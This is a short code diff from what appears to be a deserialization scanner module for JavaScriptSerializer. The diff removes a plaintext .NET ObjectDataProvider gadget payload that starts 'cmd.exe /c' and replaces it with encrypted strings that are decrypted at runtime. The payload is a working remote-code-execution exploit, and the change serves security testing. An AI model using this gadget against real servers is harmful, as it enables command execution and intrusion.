@@ -22,8 +22,8 @@ import java.util.regex.Pattern;
  **********************************************************/
 public class JavascriptSerializerModule extends FreddyModuleBase {
     //ObjectDataProvider payload data
-    private static final String OBJD_PREFIX = "{'__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','ObjectInstance':{'__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','StartInfo': {'__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','FileName':'cmd.exe','Arguments':'/c ";
-    private static final String OBJD_SUFFIX = "'}}}";
+    private final String OBJD_PREFIX = decrypt("0kYvCEfbekqnHbd8ln6AC0frRKpEolbL5zFCRioj3gxsyDuHmCtYD+ArQ6KGox37DtUPP8tn0xCgX24EBf1WPHwhYT8Adj0cse1b+gdkIjKCxrrU8m0dHmD9PoJEPshy/ItnyB6Ox3AP6DCZT3v0k9Wb2WeF0+dttzOYM69Nn1qtLGxpzeBpa6EqHr2cNMXkIkkSyd/gmvTGV3B5HFwe3jZnfk649tMz68G/FHB3Xo8dEednNadv1Q0/WcsOD9RGw0YT8veMi8iqzyvhrexKqOx3sHgPaBBW5rZinvOeNcX814a3nodJehNNd3S7bWV/P4fOMzbQL7lUkDMHK2meZ7wIFLsr/4ChPPxY7yDjKy4TppRFRahpYCjCi0hgmzfY9sUz/CiVXxA4fxVtkq7FFbDSLsImZjek3vajGq62x1Jdtb5u7oINW+NNPITBg6Lh7N4JHCXIvnICxfeyWjFEnq+y3XwcNCeIGohDdOGi8W6CxrrU8m0dHmD9PoJEPshy/ItnyB6Ox3AP6DCZT3v0kyCkiv1jzOLUIC6usXtfpSKe3Ns5dzwRQqkF4UlQXi5FPVoc5yJ5dHGqNKD64Gw3fUTWRIaJkbYIZf7M0Gszu024BsGQGFnUAmKE53T8sCuz");
+    private final String OBJD_SUFFIX = decrypt("4dshSQ/daFbXeBxGdVZDYg==");
 
     protected void initialiseModule() {
         setName("JavascriptSerializer");
